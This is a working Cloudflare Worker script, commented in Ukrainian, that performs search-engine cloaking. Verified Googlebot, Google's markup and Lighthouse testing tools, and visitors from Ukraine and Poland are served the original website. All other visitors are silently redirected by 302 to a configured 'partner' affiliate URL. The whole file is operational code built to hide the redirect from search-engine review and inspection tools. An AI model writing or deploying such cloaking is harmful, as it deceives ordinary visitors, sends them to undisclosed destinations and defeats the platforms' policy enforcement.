// Динамічні налаштування для конкретного воркера/домену
const CLOAK_CFG = {
  // Сюди ставимо оригінальний сайт, який показуємо гуглу/білим ГЕО/виключенням
  originBase: "https://example.com",
  // Партнерська посилання для редиректу (обовʼязково з протоколом)
  partnerUrl: "https://partner.example.com",
  // Список ГЕО (ISO 3166-1 alpha-2) яким не робимо редирект, віддаємо оригінал
  bypassGeos: ["UA", "PL"],
  // Шлях(и) до WP, які ніколи не редиректимо (вказуємо без домену, з косою рискою)
  wpPaths: ["/wp-admin", "/wpadmin12"],
  // Налаштування перевірки googlebot по reverse DNS
  verifyReverseDns: true,
  failOpenOnDnsError: true,
  rdnsCacheTtl: 600,
  // Чи ставитись до інструментів розмітки (Rich Results, Lighthouse) як до Google
  treatMarkupTestsAsGoogle: true
};

// ---------- Допоміжні функції ----------
function ensureUrl(value) {
  if (!value) return "";
  if (/^https?:\/\//i.test(value)) return value;
  return `https://${value}`;
}

function joinPaths(basePath, reqPath) {
  const a = (basePath || "/").replace(/\/+$/, "");
  const b = (reqPath || "/").replace(/^\/+/, "");
  return b ? `${a}/${b}` : `${a}/`;
}

function buildTarget(baseUrl, reqUrl, preservePath = true) {
  const base = new URL(ensureUrl(baseUrl));
  const basePath = base.pathname || "/";
  const reqPath = reqUrl.pathname || "/";

  if (preservePath) {
    // Якщо запит уже містить базовий шлях (наприклад, /ko-kr/...), не дублюємо його.
    const normalizedBase = basePath.replace(/\/+$/, "/");
    if (normalizedBase !== "/" && reqPath.startsWith(normalizedBase)) {
      base.pathname = reqPath;
    } else {
      base.pathname = joinPaths(basePath, reqPath);
    }
  } else {
    // Використовуємо шлях, заданий у baseUrl, без додавання шляху запиту.
    base.pathname = basePath;
  }

  base.search = reqUrl.search;
  return base.toString();
}

function looksLikeGooglebotUa(ua) {
  ua = (ua || "").toLowerCase();
  return (
    ua.includes("googlebot") ||
    ua.includes("adsbot-google") ||
    ua.includes("mediapartners-google")
  );
}

function looksLikeMarkupTest(ua) {
  ua = (ua || "").toLowerCase();
  return (
    ua.includes("rich results") ||
    ua.includes("richresult") ||
    ua.includes("structured") ||
    ua.includes("schema") ||
    ua.includes("webmasters") ||
    ua.includes("google-inspectiontool") ||
    ua.includes("inspection tool") ||
    ua.includes("google page speed") ||
    ua.includes("lighthouse")
  );
}

async function dohResolve(name, type) {
  const url = new URL("https://cloudflare-dns.com/dns-query");
  url.searchParams.set("name", name);
  url.searchParams.set("type", type);

  const res = await fetch(url.toString(), {
    headers: { accept: "application/dns-json" },
    cf: { cacheTtl: 300, cacheEverything: true }
  });

  if (!res.ok) throw new Error("DoH failed");
  return res.json();
}

function ipToPtrName(ip) {
  if (ip.includes(".")) {
    return ip.split(".").reverse().join(".") + ".in-addr.arpa";
  }
  if (ip.includes(":")) {
    const parts = ip.toLowerCase().split("::");
    const left = parts[0] ? parts[0].split(":") : [];
    const right = parts[1] ? parts[1].split(":") : [];
    const missing = 8 - (left.length + right.length);
    const full = [
      ...left,
      ...Array(Math.max(0, missing)).fill("0"),
      ...right
    ]
      .map(x => x.padStart(4, "0"))
      .join("");
    return full.split("").reverse().join(".") + ".ip6.arpa";
  }
  return null;
}

async function forwardHasIp(host, ip) {
  const ips = new Set();
  const a = await dohResolve(host, "A");
  for (const ans of a.Answer || []) if (ans.data) ips.add(ans.data);
  const aaaa = await dohResolve(host, "AAAA");
  for (const ans of aaaa.Answer || [])
    if (ans.data) ips.add(ans.data.toLowerCase());
  return ips.has(ip.toLowerCase());
}

async function verifyGooglebotByReverseDns(ip) {
  const ptrName = ipToPtrName(ip);
  if (!ptrName) return false;

  const ptr = await dohResolve(ptrName, "PTR");
  const hosts = (ptr.Answer || [])
    .map(a => (a.data || "").replace(/\.$/, ""))
    .filter(Boolean);

  if (hosts.length === 0) return false;

  const host = hosts[0].toLowerCase();
  if (!host.endsWith(".googlebot.com") && !host.endsWith(".google.com")) {
    return false;
  }
  return forwardHasIp(host, ip);
}

async function cachedVerifyGooglebot(ip, ttlSeconds) {
  const cacheKey = new Request(
    `https://rdns-cache.local/verify?ip=${encodeURIComponent(ip)}`
  );
  const cache = caches.default;

  const hit = await cache.match(cacheKey);
  if (hit) return (await hit.text()) === "1";

  const ok = await verifyGooglebotByReverseDns(ip);
  await cache.put(
    cacheKey,
    new Response(ok ? "1" : "0", {
      headers: { "Cache-Control": `max-age=${Math.max(60, ttlSeconds || 600)}` }
    })
  );
  return ok;
}

function pathMatchesWp(requestPath, wpPaths = []) {
  const clean = (wpPaths || []).map(p =>
    (p || "").trim().replace(/\/+$/, "").toLowerCase()
  );
  const current = (requestPath || "").toLowerCase();
  return clean.some(p => p && current.startsWith(p));
}

// ---------- Основна логіка ----------
addEventListener("fetch", event => {
  event.respondWith(handleRequest(event.request));
});

async function handleRequest(request) {
  const cfg = {
    ...CLOAK_CFG,
    partnerUrl: ensureUrl(CLOAK_CFG.partnerUrl),
    originBase: ensureUrl(CLOAK_CFG.originBase)
  };

  if (!cfg.partnerUrl) {
    return new Response("Партнерська URL не задана", { status: 500 });
  }

  const url = new URL(request.url);
  const country = ((request.cf || {}).country || "").toUpperCase();
  const uaHeader = request.headers.get("User-Agent") || "";
  const ip = request.headers.get("CF-Connecting-IP") || "";

  // 1) Не чіпаємо WP-адмінки, одразу віддаємо оригінал
  if (pathMatchesWp(url.pathname, cfg.wpPaths)) {
    const originTarget = buildTarget(cfg.originBase, url);
    return fetch(new Request(originTarget, request));
  }

  // 2) Перевірка на реального Googlebot (UA + reverse DNS)
  const precheckGoogle = looksLikeGooglebotUa(uaHeader);
  const isMarkupTool = cfg.treatMarkupTestsAsGoogle && looksLikeMarkupTest(uaHeader);
  let isRealGooglebot = false;
  if (precheckGoogle && cfg.verifyReverseDns) {
    try {
      isRealGooglebot = await cachedVerifyGooglebot(ip, cfg.rdnsCacheTtl);
    } catch (err) {
      isRealGooglebot = cfg.failOpenOnDnsError ? true : false;
    }
  }

  if (isRealGooglebot || isMarkupTool) {
    // Гуглу віддаємо оригінальний сайт
    const originTarget = buildTarget(cfg.originBase, url);
    return fetch(new Request(originTarget, request));
  }

  // 3) Якщо ГЕО у списку виключень — показуємо оригінал
  const bypassList = Array.isArray(cfg.bypassGeos)
    ? cfg.bypassGeos.map(c => (c || "").toUpperCase())
    : [];
  if (bypassList.includes(country)) {
    const originTarget = buildTarget(cfg.originBase, url);
    return fetch(new Request(originTarget, request));
  }

  // 4) Усі інші — 302 на партнерку, реферер залишиться автоматично
  const partnerTarget = buildTarget(cfg.partnerUrl, url, false);
  return Response.redirect(partnerTarget, 302);
}
